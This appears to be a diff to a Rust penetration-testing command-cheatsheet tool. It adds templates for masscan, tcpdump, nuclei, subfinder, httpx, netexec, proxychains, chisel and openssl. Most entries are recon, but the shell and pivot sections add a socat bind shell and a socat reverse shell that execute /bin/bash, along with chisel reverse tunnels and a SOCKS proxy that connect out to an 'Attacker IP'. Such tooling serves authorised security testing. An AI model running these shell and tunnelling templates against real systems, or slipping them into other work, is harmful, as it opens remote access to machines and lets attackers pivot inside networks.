@@ -159,6 +159,47 @@ pub const RECON_COMMANDS: &[Command] = &[
         tags: &["nmap", "aggressive", "full"],
         category: Category::Recon,
     },
+    // NEW: masscan
+    Command {
+        name: "Masscan - Quick TCP",
+        description: "Async full TCP port scan (fast)",
+        template: "masscan {target} -p1-65535 --rate 1000",
+        params: &[Param { key: "target", label: "Target IP", default: None }],
+        tags: &["masscan", "async", "fast"],
+        category: Category::Recon,
+    },
+    Command {
+        name: "Masscan - Specific Ports",
+        description: "Async scan on custom ports",
+        template: "masscan {target} -p{ports} --rate 1000",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "ports", label: "Ports", default: Some("80,443,8080") },
+        ],
+        tags: &["masscan", "async"],
+        category: Category::Recon,
+    },
+    // NEW: tcpdump
+    Command {
+        name: "TCPdump - Capture Host",
+        description: "Capture packets to/from target",
+        template: "sudo tcpdump -i {interface} host {target} -w {output}",
+        params: &[
+            Param { key: "interface", label: "Interface", default: Some("eth0") },
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "output", label: "PCAP file", default: Some("capture.pcap") },
+        ],
+        tags: &["tcpdump", "capture", "pcap"],
+        category: Category::Recon,
+    },
+    Command {
+        name: "TCPdump - Quick Sniff",
+        description: "Sniff 50 packets on interface",
+        template: "sudo tcpdump -i {interface} -nn -c 50",
+        params: &[Param { key: "interface", label: "Interface", default: Some("eth0") }],
+        tags: &["tcpdump", "sniff"],
+        category: Category::Recon,
+    },
 ];
 
 // ─── WEB ────────────────────────────────────────────────────────────────────
@@ -250,6 +291,60 @@ pub const WEB_COMMANDS: &[Command] = &[
         tags: &["curl", "headers"],
         category: Category::Web,
     },
+    // NEW: nuclei
+    Command {
+        name: "Nuclei - Quick Scan",
+        description: "Scan with specific templates",
+        template: "nuclei -u http://{target} -t {templates}",
+        params: &[
+            Param { key: "target", label: "Target host", default: None },
+            Param { key: "templates", label: "Template path", default: Some("~/nuclei-templates/") },
+        ],
+        tags: &["nuclei", "vuln", "yaml"],
+        category: Category::Web,
+    },
+    Command {
+        name: "Nuclei - Full Templates",
+        description: "Scan with all templates",
+        template: "nuclei -u http://{target}",
+        params: &[Param { key: "target", label: "Target host", default: None }],
+        tags: &["nuclei", "full", "vuln"],
+        category: Category::Web,
+    },
+    // NEW: subfinder
+    Command {
+        name: "Subfinder - Passive",
+        description: "Passive subdomain discovery",
+        template: "subfinder -d {domain}",
+        params: &[Param { key: "domain", label: "Domain", default: None }],
+        tags: &["subfinder", "subdomain", "passive"],
+        category: Category::Web,
+    },
+    Command {
+        name: "Subfinder + Httpx",
+        description: "Find subs then probe with httpx",
+        template: "subfinder -d {domain} | httpx",
+        params: &[Param { key: "domain", label: "Domain", default: None }],
+        tags: &["subfinder", "httpx", "chain"],
+        category: Category::Web,
+    },
+    // NEW: httpx
+    Command {
+        name: "Httpx - Prober",
+        description: "Probe single host",
+        template: "echo {target} | httpx",
+        params: &[Param { key: "target", label: "Target host", default: None }],
+        tags: &["httpx", "probe"],
+        category: Category::Web,
+    },
+    Command {
+        name: "Httpx - Title Tech",
+        description: "Probe with title, tech, status",
+        template: "echo {target} | httpx -title -tech-detect -status-code",
+        params: &[Param { key: "target", label: "Target host", default: None }],
+        tags: &["httpx", "title", "tech"],
+        category: Category::Web,
+    },
 ];
 
 // ─── SMB ────────────────────────────────────────────────────────────────────
@@ -312,6 +407,31 @@ pub const SMB_COMMANDS: &[Command] = &[
             Param { key: "pass", label: "Password", default: Some("''") },
         ],
         tags: &["cme", "crackmapexec", "smb"],
+        category: Category::Smb,
+    },
+    // NEW: netexec
+    Command {
+        name: "NetExec - SMB",
+        description: "SMB recon with netexec (cme successor)",
+        template: "netexec smb {target} -u {user} -p {pass} --shares",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("guest") },
+            Param { key: "pass", label: "Password", default: Some("''") },
+        ],
+        tags: &["netexec", "nxc", "smb"],
+        category: Category::Smb,
+    },
+    Command {
+        name: "NetExec - WinRM",
+        description: "WinRM recon with netexec",
+        template: "netexec winrm {target} -u {user} -p {pass}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("administrator") },
+            Param { key: "pass", label: "Password", default: Some("''") },
+        ],
+        tags: &["netexec", "winrm"],
         category: Category::Smb,
     },
 ];
@@ -527,6 +647,40 @@ pub const SHELL_COMMANDS: &[Command] = &[
             Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
         ],
         tags: &["msfvenom", "payload", "windows", "exe"],
+        category: Category::Shells,
+    },
+    // NEW: socat
+    Command {
+        name: "Socat - Bind Shell",
+        description: "Bind shell with socat",
+        template: "socat TCP-LISTEN:{lport},fork EXEC:/bin/bash",
+        params: &[
+            Param { key: "lport", label: "Port to listen on", default: Some("4444") },
+        ],
+        tags: &["socat", "bind", "shell"],
+        category: Category::Shells,
+    },
+    Command {
+        name: "Socat - Reverse Shell",
+        description: "Reverse shell with socat",
+        template: "socat TCP:{lhost}:{lport} EXEC:/bin/bash",
+        params: &[
+            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
+            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
+        ],
+        tags: &["socat", "reverse", "shell"],
+        category: Category::Shells,
+    },
+    Command {
+        name: "Socat - Port Forward",
+        description: "Local port forward via socat",
+        template: "socat TCP-LISTEN:{local_port},fork TCP:{target}:{remote_port}",
+        params: &[
+            Param { key: "local_port", label: "Local port", default: Some("8080") },
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "remote_port", label: "Remote port", default: Some("80") },
+        ],
+        tags: &["socat", "forward", "pivot"],
         category: Category::Shells,
     },
 ];
@@ -748,6 +902,59 @@ pub const POST_COMMANDS: &[Command] = &[
         tags: &["transfer", "nc", "file"],
         category: Category::Post,
     },
+    // NEW: proxychains
+    Command {
+        name: "Proxychains - Nmap",
+        description: "Run nmap through proxy",
+        template: "proxychains nmap -sT -Pn {target}",
+        params: &[Param { key: "target", label: "Target IP", default: None }],
+        tags: &["proxychains", "nmap", "pivot"],
+        category: Category::Post,
+    },
+    Command {
+        name: "Proxychains - SSH",
+        description: "SSH through proxy",
+        template: "proxychains ssh {user}@{target}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("root") },
+        ],
+        tags: &["proxychains", "ssh", "pivot"],
+        category: Category::Post,
+    },
+    // NEW: chisel
+    Command {
+        name: "Chisel - Server",
+        description: "Start chisel server with reverse support",
+        template: "chisel server -p {port} --reverse",
+        params: &[Param { key: "port", label: "Server port", default: Some("8080") }],
+        tags: &["chisel", "server", "tunnel"],
+        category: Category::Post,
+    },
+    Command {
+        name: "Chisel - Client Reverse",
+        description: "Reverse tunnel local port to attacker",
+        template: "chisel client http://{lhost}:{port} R:{local_port}:127.0.0.1:{remote_port}",
+        params: &[
+            Param { key: "lhost", label: "Attacker IP", default: None },
+            Param { key: "port", label: "Server port", default: Some("8080") },
+            Param { key: "local_port", label: "Local port to expose", default: Some("8080") },
+            Param { key: "remote_port", label: "Remote port on attacker", default: Some("8080") },
+        ],
+        tags: &["chisel", "client", "reverse", "tunnel"],
+        category: Category::Post,
+    },
+    Command {
+        name: "Chisel - SOCKS Proxy",
+        description: "Create SOCKS5 proxy through chisel",
+        template: "chisel client http://{lhost}:{port} socks",
+        params: &[
+            Param { key: "lhost", label: "Attacker IP", default: None },
+            Param { key: "port", label: "Server port", default: Some("8080") },
+        ],
+        tags: &["chisel", "socks", "proxy", "pivot"],
+        category: Category::Post,
+    },
 ];
 
 // ─── CRYPTO / CRACKING ───────────────────────────────────────────────────
@@ -827,6 +1034,40 @@ pub const CRYPTO_COMMANDS: &[Command] = &[
             Param { key: "output", label: "Output file", default: Some("wordlist.txt") },
         ],
         tags: &["crunch", "wordlist", "generate"],
+        category: Category::Crypto,
+    },
+    // NEW: openssl
+    Command {
+        name: "OpenSSL - Connect TLS",
+        description: "Connect and inspect TLS",
+        template: "openssl s_client -connect {target}:{port}",
+        params: &[
+            Param { key: "target", label: "Target host", default: None },
+            Param { key: "port", label: "Port", default: Some("443") },
+        ],
+        tags: &["openssl", "tls", "connect"],
+        category: Category::Crypto,
+    },
+    Command {
+        name: "OpenSSL - Get Certificate",
+        description: "Dump certificate details",
+        template: "echo | openssl s_client -connect {target}:{port} 2>/dev/null | openssl x509 -noout -text",
+        params: &[
+            Param { key: "target", label: "Target host", default: None },
+            Param { key: "port", label: "Port", default: Some("443") },
+        ],
+        tags: &["openssl", "cert", "x509"],
+        category: Category::Crypto,
+    },
+    Command {
+        name: "OpenSSL - Generate Hash",
+        description: "Hash text with OpenSSL",
+        template: "echo -n '{text}' | openssl dgst -{algorithm}",
+        params: &[
+            Param { key: "text", label: "Text to hash", default: None },
+            Param { key: "algorithm", label: "Algorithm (sha256, md5, etc)", default: Some("sha256") },
+        ],
+        tags: &["openssl", "hash", "digest"],
         category: Category::Crypto,
     },
 ];
